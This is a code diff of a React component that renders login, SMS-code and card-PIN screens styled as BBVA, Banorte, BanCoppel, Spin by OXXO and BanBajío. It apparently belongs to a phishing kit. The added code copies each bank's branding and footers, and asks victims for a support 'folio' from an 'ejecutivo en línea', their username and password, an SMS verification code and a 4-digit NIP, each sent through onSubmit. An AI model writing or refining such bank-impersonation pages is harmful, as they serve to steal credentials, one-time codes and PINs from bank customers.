@@ -44,10 +44,85 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
   // Helper function to render the appropriate screen
   const renderScreen = () => {
-    // Función para aplicar estilos específicos del banco a los contenedores
+    // Función para obtener el contenedor según el banco
     const getBankContainer = (children: React.ReactNode) => {
       if (banco === 'BBVA') {
-        return children; // El contenedor ya está en el layout de BBVA
+        return (
+          <div className="bbva-container">
+            <div className="bbva-header">
+              {bankLogo()}
+            </div>
+            <div className="bbva-content">
+              {children}
+            </div>
+          </div>
+        );
+      } else if (banco === 'BANORTE') {
+        return (
+          <div className="banorte-container">
+            <div className="banorte-header">
+              {bankLogo()}
+            </div>
+            <div className="banorte-content">
+              {children}
+            </div>
+            <div className="banorte-footer">
+              <div className="banorte-nav">
+                <a href="#">Aprende más</a> |
+                <a href="#">Ayuda</a> |
+                <a href="#">Términos y condiciones</a> |
+                <a href="#">Seguridad en línea</a>
+              </div>
+              <p>© Banorte México 2025. Todos los Derechos Reservados</p>
+            </div>
+          </div>
+        );
+      } else if (banco === 'BANCOPPEL') {
+        return (
+          <div className="bancoppel-container">
+            <div className="bancoppel-header">
+              {bankLogo()}
+              <strong>7 de abril de 2025</strong>
+            </div>
+            <div className="bancoppel-content">
+              {bankLogo()}
+              {children}
+            </div>
+            <div className="bancoppel-footer-links">
+              Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
+            </div>
+            <div className="bancoppel-footer">
+              Contactanos | Aclaraciones | Promociones | Facebook | Youtube <br />
+              Copyright 2025 Bancoppel S.A Institución de Banca Múltiple - Todos los derechos reservados
+            </div>
+          </div>
+        );
+      } else if (banco === 'SPIN') {
+        return (
+          <div className="spin-container">
+            <div className="spin-header">
+              <h1>spin <small>by oxxo</small></h1>
+            </div>
+            <div className="spin-date">7 de abril de 2025</div>
+            <div className="spin-content">
+              {children}
+            </div>
+            <div className="spin-links">
+              <a href="#">Aprende más</a> |
+              <a href="#">Ayuda</a> |
+              <a href="#">Términos y condiciones</a> |
+              <a href="#">Seguridad en línea</a>
+            </div>
+            <div className="spin-bottom-links">
+              <a href="#">Contáctanos</a> |
+              <a href="#">Aclaraciones</a> |
+              <a href="#">Promociones</a> |
+              <a href="#">Facebook</a> |
+              <a href="#">Youtube</a>
+              <p>Spin by OXXO © 2025. Todos los Derechos Reservados</p>
+            </div>
+          </div>
+        );
       } else {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
@@ -61,54 +136,53 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
       }
     };
+
+    // Contenido para la pantalla de FOLIO
+    const folioContent = (
+      <>
+        <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
+        <p className="mb-4">
+          {banco === 'BANBAJIO' 
+            ? "Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó."
+            : "Ingrese el folio que su ejecutivo le proporcionó."
+          }
+        </p>
+        <Input 
+          type="text" 
+          placeholder="Ingrese su número de folio" 
+          className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+          value={folioInput}
+          onChange={(e) => setFolioInput(e.target.value)}
+        />
+        <Button 
+          className={primaryBtnClass}
+          onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+        >
+          Ingresar
+        </Button>
+      </>
+    );
     
     switch (currentScreen) {
       case ScreenType.FOLIO:
-        return getBankContainer(
-            <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
-            <p className="mb-4">
-              {banco === 'BANBAJIO' 
-                ? "Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó."
-                : "Ingrese el folio que su ejecutivo le proporcionó."
-              }
-            </p>
-            <Input 
-              type="text" 
-              placeholder="Ingrese su número de folio" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
-              value={folioInput}
-              onChange={(e) => setFolioInput(e.target.value)}
-            />
-            <Button 
-              className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
-            >
-              Ingresar
-            </Button>
-          </div>
-        );
+        return getBankContainer(folioContent);
 
       case ScreenType.LOGIN:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {banco === 'BANBAJIO' && (
-              <div className="bajionet text-2xl font-bold mb-3">
-                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
-              </div>
-            )}
+        const loginContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Inicio de sesión:</h2>
             <p className="mb-4">Ingrese su usuario y contraseña.</p>
             <Input 
               type="text" 
               placeholder="Usuario" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
+              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
               value={loginInputs.username}
               onChange={(e) => setLoginInputs(prev => ({ ...prev, username: e.target.value }))}
             />
             <Input 
               type="password" 
               placeholder="Contraseña" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
+              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
               value={loginInputs.password}
               onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
             />
@@ -118,17 +192,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Ingresar
             </Button>
-          </div>
+          </>
         );
+        return getBankContainer(loginContent);
 
       case ScreenType.CODIGO:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {banco === 'BANBAJIO' && (
-              <div className="bajionet text-2xl font-bold mb-3">
-                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
-              </div>
-            )}
+        const codigoContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Hemos enviado un código de verificación</h2>
             <p className="mb-4">
               Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "1881"}</strong>
@@ -136,7 +206,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <Input 
               type="text" 
               placeholder="Ingrese el SMS recibido" 
-              className="w-full border border-gray-300 rounded p-2 mb-3"
+              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
               value={codigoInput}
               onChange={(e) => setCodigoInput(e.target.value)}
             />
@@ -152,19 +222,20 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
               </div>
             )}
-          </div>
+          </>
         );
+        return getBankContainer(codigoContent);
 
       case ScreenType.NIP:
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+        const nipContent = (
+          <>
             <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
             <p className="mb-4">Para continuar, por favor ingresa el NIP de tu tarjeta.</p>
             <Input 
               type="password" 
               placeholder="Ingrese su NIP" 
               maxLength={4}
-              className="w-full border border-gray-300 rounded p-2 mb-3"
+              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
               value={nipInput}
               onChange={(e) => setNipInput(e.target.value)}
             />
@@ -174,8 +245,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             >
               Continuar
             </Button>
-          </div>
+          </>
         );
+        return getBankContainer(nipContent);
 
       case ScreenType.PROTEGER:
         return (
